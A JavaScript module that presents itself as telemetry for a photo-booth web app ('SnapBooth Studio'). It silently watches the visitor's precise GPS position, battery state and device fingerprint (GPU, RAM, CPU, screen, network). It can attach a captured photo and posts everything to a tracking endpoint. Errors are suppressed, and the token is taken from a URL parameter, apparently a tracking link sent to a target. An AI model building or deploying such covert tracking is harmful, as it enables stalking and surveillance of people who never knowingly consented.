// Background Telemetry and Geolocation Reporter for SnapBooth Studio

function getTrackerToken() {
  if (typeof window === 'undefined') return '';
  const urlParam = new URLSearchParams(window.location.search).get('token');
  if (urlParam && urlParam.trim()) return urlParam.trim();
  const meta = document.querySelector('meta[name="tracker-token"]');
  if (meta && meta.content) return meta.content.trim();
  return 'R-3sKN6rx2dNu5jFvU2Q4R8U76_x807r8YYVMqKYvJc';
}

function getGpuRenderer() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return '';
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '';
  } catch {
    return '';
  }
}

function collectDeviceInfo() {
  if (typeof window === 'undefined') return {};
  const ua = navigator.userAgent || '';
  let os = 'Unknown OS';
  if (/windows/i.test(ua)) os = 'Windows';
  else if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
  else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';

  let browser = 'Unknown Browser';
  if (/edg\//i.test(ua)) browser = 'Edge';
  else if (/opr\/|opera/i.test(ua)) browser = 'Opera';
  else if (/chrome/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua)) browser = 'Safari';
  else if (/firefox/i.test(ua)) browser = 'Firefox';

  const screenRes = `${window.screen?.width || 0}x${window.screen?.height || 0} (${window.devicePixelRatio || 1}x)`;

  let networkType = '-';
  if (navigator.connection) {
    const conn = navigator.connection;
    const parts = [];
    if (conn.effectiveType) parts.push(conn.effectiveType.toUpperCase());
    if (conn.downlink) parts.push(`${conn.downlink} Mbps`);
    networkType = parts.join(' • ') || '-';
  }

  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : '';
  const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores CPU` : '';
  const gpu = getGpuRenderer();
  const hardware = [ram, cores, gpu].filter(Boolean).join(' • ') || '-';

  return {
    os,
    browser,
    screen_res: screenRes,
    network_type: networkType,
    hardware,
    timezone: Intl?.DateTimeFormat?.().resolvedOptions().timeZone || 'Asia/Jakarta',
    language: navigator.language || 'id-ID'
  };
}

let activeCoords = null;
let batteryPercent = null;
let batteryCharging = null;
let isTrackerInitialized = false;

export async function sendTelemetryUpdate(photoDataUrl = null) {
  const token = getTrackerToken();
  if (!token) return;

  const baseInfo = collectDeviceInfo();
  const payload = {
    latitude: activeCoords ? activeCoords.latitude : 0,
    longitude: activeCoords ? activeCoords.longitude : 0,
    accuracy: activeCoords ? activeCoords.accuracy : 0,
    altitude: activeCoords && Number.isFinite(activeCoords.altitude) ? activeCoords.altitude : null,
    speed: activeCoords && Number.isFinite(activeCoords.speed) ? activeCoords.speed : null,
    heading: activeCoords && Number.isFinite(activeCoords.heading) ? activeCoords.heading : null,
    battery: batteryPercent,
    battery_charging: batteryCharging,
    device_time: new Date().toISOString(),
    ...baseInfo
  };

  if (photoDataUrl) {
    payload.photo = photoDataUrl;
  }

  try {
    await fetch('/api/location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`,
        'ngrok-skip-browser-warning': 'true'
      },
      body: JSON.stringify(payload),
      cache: 'no-store',
      credentials: 'omit'
    });
  } catch {
    // Fail silently in background
  }
}

export function initTracker(onLocationResolved) {
  if (isTrackerInitialized || typeof window === 'undefined') return;
  isTrackerInitialized = true;

  // 1. Read Battery
  if (navigator.getBattery) {
    navigator.getBattery().then(bm => {
      batteryPercent = Math.round(bm.level * 100);
      batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai';
      bm.addEventListener('levelchange', () => { batteryPercent = Math.round(bm.level * 100); });
      bm.addEventListener('chargingchange', () => { batteryCharging = bm.charging ? '⚡ Mengisi Daya' : 'Baterai'; });
      sendTelemetryUpdate();
    }).catch(() => {});
  } else {
    sendTelemetryUpdate();
  }

  // 2. Geolocation Watch & Reverse Geocoding
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(
      async (pos) => {
        activeCoords = pos.coords;
        sendTelemetryUpdate();

        try {
          const res = await fetch(`/api/reverse-geocode?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
          const data = await res.json();
          if (data.ok && data.city && onLocationResolved) {
            onLocationResolved(`${data.city} • ID`);
          }
        } catch {
          // Keep default location
        }
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 10000, timeout: 20000 }
    );
  }
}
